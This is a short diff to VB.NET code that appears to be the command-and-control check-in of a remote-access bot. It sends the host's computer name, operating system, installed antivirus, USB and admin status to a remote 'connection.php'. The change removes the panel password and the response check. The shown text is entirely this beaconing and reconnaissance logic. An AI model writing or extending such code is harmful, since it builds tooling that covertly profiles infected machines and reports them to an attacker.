@@ -8,12 +8,8 @@ Namespace HTTPSocket
         Dim Socket As New WebClient
         Public Function Connect()
             Try
-                Dim Resopnse As String = _GET("connection.php?password=" & ENB(C_Password) & "&data=" & ENB(ID & "|BN|" & My.Computer.Name & "|BN|" & My.Computer.Info.OSFullName & "|BN|" & Form1.GetAntiVirus() & "|BN|Online" & "|BN|" & Form1.checkUSB() & "|BN|" & Form1.checkadmin))
-                If Resopnse = "True" Then
-                    Return True
-                Else
-                    Return False
-                End If
+                _GET("connection.php?data=" & ENB(ID & "|BN|" & My.Computer.Name & "|BN|" & My.Computer.Info.OSFullName & "|BN|" & Form1.GetAntiVirus() & "|BN|Online" & "|BN|" & Form1.checkUSB() & "|BN|" & Form1.checkadmin))
+                Return True
             Catch ex As Exception
                 Return False
             End Try
